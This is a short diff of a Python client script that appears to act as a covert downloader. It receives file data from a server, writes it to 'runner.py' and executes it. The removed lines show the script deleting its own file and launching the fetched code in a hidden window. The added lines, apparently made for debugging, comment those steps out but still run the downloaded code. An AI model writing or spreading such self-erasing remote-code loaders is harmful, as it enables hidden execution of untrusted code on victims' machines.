@@ -7,8 +7,9 @@ LOCAL_HOST_PORT = 59998
 local_network_adapters = []
 adfly_user_data_location = "C://adfly_user_data"
 def run():
-    from os import remove
-    remove('client_uname_checker.py')
+    print('client  u name')
+    #from os import remove
+    #remove('client_uname_checker.py')
     from threading import Thread
     import socket
     from random import choice
@@ -202,4 +203,5 @@ def run():
         if response['file_code'] == file_code:
             with open('runner.py', 'wb') as file:
                 file.write(response['py_file_data'])
-    subprocess.Popen('python runner.py', creationflags=subprocess.CREATE_NO_WINDOW)
+    #subprocess.Popen('python runner.py', creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.Popen('python runner.py')
